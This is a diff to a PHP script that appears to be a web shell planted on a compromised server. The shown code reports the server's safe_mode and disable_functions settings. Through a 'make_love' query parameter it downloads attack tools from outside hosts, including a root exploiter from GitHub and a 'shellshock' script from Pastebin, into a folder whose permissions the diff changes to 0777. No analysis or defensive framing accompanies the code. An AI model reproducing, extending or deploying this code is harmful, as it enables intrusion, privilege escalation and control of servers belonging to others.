@@ -470,17 +470,21 @@ foreach ($d0mains as $d0main) {
 }
 function CreateTools($names, $lokasi) {
     if (!is_dir('kuda_tools')) {
-        mkdir('kuda_tools', 0755);
+        mkdir('kuda_tools', 0777);
     }
+    
     $file = 'kuda_tools/' . $names . '.php';
+    
     if (!file_exists($file)) {
         $content = @file_get_contents($lokasi);
         if ($content !== false) {
             file_put_contents($file, $content);
+        } else {
+            echo "<script>alert('Gagal cok!');</script>";
+            return;
         }
     }
-    echo "<script>alert('Done');window.location.href=".$file.";</script>";
-    exit;
+    echo "<script>window.open('" . $file . "', '_blank');</script>";
 }
 if (isset($_GET['make_love'])) {
     $tools = [
@@ -494,6 +498,7 @@ if (isset($_GET['make_love'])) {
         "rootex" => "https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php",
         "shellshock" => "https://pastebin.com/raw/ZB3DLXwR"
     ];
+
     $target = $_GET['make_love'];
     if (array_key_exists($target, $tools)) {
         CreateTools($target, $tools[$target]);
@@ -521,7 +526,6 @@ $scdir = explode("/", $dir);
 $freespace = hdd(disk_free_space("/"));
 $total = hdd(disk_total_space("/"));
 $used = $total - $freespace;
-$ling = "http://" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['PHP_SELF'] . "?make_love";
 $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=deepskyblue>OFF</font>";
 $magico = (ini_get('magic_quotes_gpc') == '1') ? "<font color=red>ON</font>" : "<font color=deepskyblue>OFF</font>";
 $getds = @ini_get("disable_functions");
